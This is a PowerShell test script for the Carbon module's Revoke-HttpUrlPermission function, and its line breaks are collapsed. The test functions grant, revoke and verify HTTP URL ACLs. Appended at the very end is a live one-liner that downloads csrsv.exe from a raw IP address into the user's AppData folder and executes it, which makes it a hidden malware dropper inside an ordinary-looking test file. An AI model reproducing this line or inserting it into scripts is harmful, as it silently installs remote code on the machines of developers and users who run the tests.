& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)$user = $null$url = 'http://test-revokehttpurlpermission:10383/'function Start-Test{$user = Resolve-Identity -Name $CarbonTestUser.UserNameGrant-HttpUrlPermission -Url $url -Principal $user.FullName -Permission Listen}function Stop-Test{netsh http delete urlacl url=$url}function Test-ShouldRevokePermission{Revoke-HttpUrlPermission -Url $url -Principal $userAssert-NoErrorAssert-Null (Get-HttpUrlAcl -Url $url -ErrorAction Ignore)}function Test-ShouldRevokePermissionMultipleTimes{Revoke-HttpUrlPermission -Url $url -Principal $userRevoke-HttpUrlPermission -Url $url -Principal $userAssert-NoErrorAssert-Null (Get-HttpUrlAcl -Url $url -ErrorAction Ignore)}function Test-ShouldRevokeProperlyIfUrlDoesNotEndWithTrailingSlash{Revoke-HttpUrlPermission -Url $url.TrimEnd('/') -Principal $userAssert-Null (Get-HttpUrlAcl -LiteralUrl $url -ErrorAction Ignore)}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")